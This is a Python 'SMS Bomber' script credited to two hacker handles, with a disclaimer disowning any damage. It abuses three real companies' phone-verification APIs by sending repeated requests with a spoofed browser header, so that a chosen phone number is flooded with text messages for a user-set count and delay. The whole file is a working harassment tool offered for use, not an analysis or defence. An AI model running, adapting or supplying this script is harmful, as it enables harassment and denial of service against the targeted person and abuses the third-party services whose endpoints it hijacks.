import urllib.request
import urllib.error
import platform
import os
import time
import sys

def banner():
    """Clear screen and display a banner."""
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                     
                                   By : D3XBugg3R & N3S3                                                                                               
    Note : We are NOT responsible for any damage caused by this script, Use at your own risk.
""")

def choose_api():
    """Prompt user to choose an API."""
    api_options = {
        '1': "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=",
        '2': "http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=",
        '3': "https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile="
    }

    print("Choose an API from the options above:")
    for key, url in api_options.items():
        print(f"{key}. {url}")

    choice = input("Please choose a number from the API options: ").strip()

    if choice in api_options:
        return api_options[choice]
    else:
        print("Invalid choice. Please select a number from 1-3.")
        sys.exit(1)

def send(number, count, delay, url):
    """Send SMS requests using the chosen API."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
        'Accept-Encoding': 'none',
        'Accept-Language': 'en-US,en;q=0.8',
        'Connection': 'keep-alive'
    }
    result_url = url + number
    request = urllib.request.Request(result_url, headers=headers)

    for x in range(count):
        banner()
        print(f"Target Number          : {number}")
        print(f"Number of Messages Sent: {x + 1}")
        try:
            with urllib.request.urlopen(request) as response:
                print(f"Message sent successfully. Response: {response.status}")
        except urllib.error.URLError as e:
            print(f"Error: {e} occurred while sending message.")
        except Exception as ex:
            print(f"An unexpected error occurred: {ex}")
        time.sleep(delay)

def get_user_input():
    """Collects and validates user input."""
    try:
        number = input("Enter mobile number: ").strip()
        if not number.isdigit() or len(number) > 20:  # Adjust condition for your use case
            raise ValueError("Invalid mobile number. Please enter a 10-digit number.")
        
        count = int(input("Enter the number of messages: "))
        delay = int(input("Enter delay time between messages (in seconds): "))
        
        if count <= 0 or delay < 0:
            raise ValueError("Count and delay must be positive numbers.")
        
        return number, count, delay
    except ValueError as ve:
        print(f"Input Error: {ve}")
        sys.exit(1)

try:
    banner()
    api_url = choose_api()
    number, count, delay = get_user_input()
    send(number, count, delay, api_url)
    sys.exit(0)
except Exception as e:
    print(f"Error: {e} occurred. Please restart the script.")
    sys.exit(1)
